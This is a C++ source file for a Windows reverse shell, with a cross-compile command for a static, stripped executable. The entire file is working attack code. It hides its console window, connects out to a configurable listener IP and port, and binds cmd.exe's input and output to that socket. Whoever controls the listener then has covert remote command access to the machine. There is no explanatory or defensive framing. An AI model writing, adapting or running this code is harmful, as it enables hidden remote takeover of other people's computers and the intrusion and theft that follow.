// reverse_shell.cpp - Windows Reverse Shell (x86/x64)
// Compile with: x86_64-w64-mingw32-g++ -o reverse_shell.exe reverse_shell.cpp -lws2_32 -static -s

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32.lib")

int main() {
    // Hide console window (optional)
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }

    // Create socket
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    // Set up server address (CHANGE THESE!)
    server.sin_family = AF_INET;
    server.sin_port = htons(4444);                 // Change to your listener port
    server.sin_addr.s_addr = inet_addr("192.168.1.100"); // Change to your listener IP

    // Connect to listener
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Prepare STARTUPINFO to redirect stdin/stdout/stderr to socket
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

    // Launch cmd.exe with redirected handles
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

    // Wait for cmd.exe to exit
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Clean up
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(sock);
    WSACleanup();

    return 0;
}
